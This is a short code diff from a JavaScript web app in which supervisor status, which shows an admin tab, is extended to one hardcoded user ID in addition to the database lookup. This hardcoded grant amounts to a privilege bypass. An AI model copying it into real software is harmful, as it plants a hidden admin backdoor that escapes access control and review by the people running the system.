@@ -438,7 +438,8 @@
       };
       renderUserHeader();
       const supervisors = await dbGet('supervisor_users', `line_uid=eq.${currentUser.uid}`);
-      isSupervisor = Array.isArray(supervisors) && supervisors.length > 0;
+      isSupervisor = (Array.isArray(supervisors) && supervisors.length > 0)
+                  || currentUser.uid === 'U435cc1b1fd35f5254cabb7ff1f4022a4';
       document.getElementById('admin-tab').style.display = isSupervisor ? '' : 'none';
       await loadStores();
       show('view-main');
